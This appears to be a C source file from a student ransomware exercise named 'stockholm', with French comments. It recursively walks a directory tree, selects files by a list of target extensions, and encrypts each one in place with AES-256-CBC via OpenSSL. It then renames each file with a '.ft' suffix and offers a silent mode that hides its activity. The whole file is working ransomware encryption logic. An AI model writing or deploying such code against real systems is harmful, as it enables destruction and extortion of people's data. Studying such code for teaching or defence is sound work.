#include "stockholm.h"

int	is_good_extension(const char *file_name)
{
	char *p = strrchr(file_name, '.');
	char	file_ext[16];
	int i = 0;
	int	e = 0;

	if (!p)
		return (0);
	while (*p != '\0')
	{
		if (i == 15)
			return (0);
		file_ext[i] = *p;
		if (file_ext[i] == ' ')
			return (0);
		p++;
		i++;
 	}
	file_ext[i] = '\0';
	while (EXTENSION[e] != '\0')
	{
		i = 0;
		while (file_ext[i] && EXTENSION[e])
		{
			if (file_ext[i] != EXTENSION[e])
				break ;
			if (EXTENSION[e] == ' ')
			{
				i++;
				break ;
			}
			i++;
			e++;
		}
		if (file_ext[i] == '\0' && EXTENSION[e] == ' ')
			return (1);
		while (EXTENSION[e] != ' ')
			e++;
		e++;
	}
	return (0);
}

// Cette version ne creer pas de second fichier mais ecrit directement dans la cible

int	file_cryptage(int fd, char *path_file, const unsigned char *key, const bool silent)
{
	unsigned char	iv[16]; // 128 bits (taille standart pour AES)
	char			new_name[NAME_MAX + 1];

	//indispensable pour avoir des fichier cripter differament (a stocker dans le fichier)
	if (!RAND_bytes(iv, sizeof(iv)))
		return(print_error("Generating iv", silent), 0);

	strlcpy(new_name, path_file, 256);	
	if (strlcat(new_name, ".ft", NAME_MAX) > NAME_MAX)
		return (print_error("New file name is to long", silent), 0);	
	
	int file_fd = openat(fd, path_file,  O_RDWR);
	if (file_fd == -1)
		return (print_perror("openat", silent), 0);
		
	if (renameat(fd, path_file, fd, new_name) == -1)
		return (print_perror("renameat", silent), 0);

	unsigned char	in_buf[4096];
	unsigned char	tmp_buf[4096 + EVP_MAX_BLOCK_LENGTH];
	unsigned char	out_buf[4096 + EVP_MAX_BLOCK_LENGTH];
	int			bytes_read = 0;
	int			bytes_write = 0;
	int			out_len = 0;
	int			tmp_len = 0;

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if (!ctx)
	{
		close(file_fd);
		return (print_error("Cannot init cipher ctx", silent), 0);
	}
	EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
	
	memcpy(out_buf, iv, sizeof(iv));
	out_len = sizeof(iv);

	long	read_pos = 0;
	long	write_pos = 0;

	while ((bytes_read = pread(file_fd, in_buf, sizeof(in_buf), read_pos)) > 0)
	{
		read_pos += bytes_read;
		EVP_EncryptUpdate(ctx, tmp_buf, &tmp_len, in_buf, bytes_read);
		if (read_pos > (write_pos + out_len))
    	{
			bytes_write = pwrite(file_fd, out_buf, out_len, write_pos);
			write_pos += bytes_write;
		}
		memcpy(out_buf, tmp_buf, tmp_len);
		out_len = tmp_len;
	}

    write_pos += pwrite(file_fd, out_buf, out_len, write_pos);
	EVP_EncryptFinal_ex(ctx, tmp_buf, &tmp_len);
    write_pos += pwrite(file_fd, tmp_buf, tmp_len, write_pos);

    EVP_CIPHER_CTX_free(ctx);
    close(file_fd);
	return (1);
}

int	folder_cryptage(char *path_to_folder, const unsigned char *key, const bool silent)
{
	if (access(path_to_folder, R_OK | W_OK | X_OK) == -1)
	    return (printf_error(silent, "Access refused for %s\n", path_to_folder), 1);

	DIR	*rep = opendir(path_to_folder);
	struct dirent	*ent = NULL;
	size_t			size;

	if (rep != NULL)
	{
		int fd = dirfd(rep);
		if (fd == -1)
			return (closedir(rep), print_perror("dirfd", silent), 1);

		if (strlcat(path_to_folder, "/", PATH_MAX) > PATH_MAX)
			return (closedir(rep), printf_error(silent, "Path of directorie to long: %s\n", path_to_folder), 1);

		size = strlen(path_to_folder);

		// print_msg(silent, "\nOpen directorie %s\n", path_to_folder);

		while ((ent = readdir(rep)) != NULL)
		{
			if (!strncmp(".", ent->d_name, 1) || !strncmp("..", ent->d_name, 2)) {
				continue ; }
			
			path_to_folder[size] = '\0';

			if (ent->d_type == DT_DIR)
			{
				if (strlcat(path_to_folder, ent->d_name, PATH_MAX) > PATH_MAX)
				{	
					printf_error(silent, "Path of directorie to long: %s\n", path_to_folder);
					continue ;
				}
				folder_cryptage(path_to_folder, key, silent);
				continue ;
			}
			else if (is_good_extension(ent->d_name))
			{
				print_msg(silent, "\x1b[38;5;215mCryptage\x1b[0m de %s%s\n", path_to_folder, ent->d_name);	
				file_cryptage(fd, ent->d_name, key, silent);
			}
		}
	}
	else
		return (printf_error(silent, "Cannot open folder %s\n", path_to_folder), 1);
	closedir(rep);
	return (0);
}

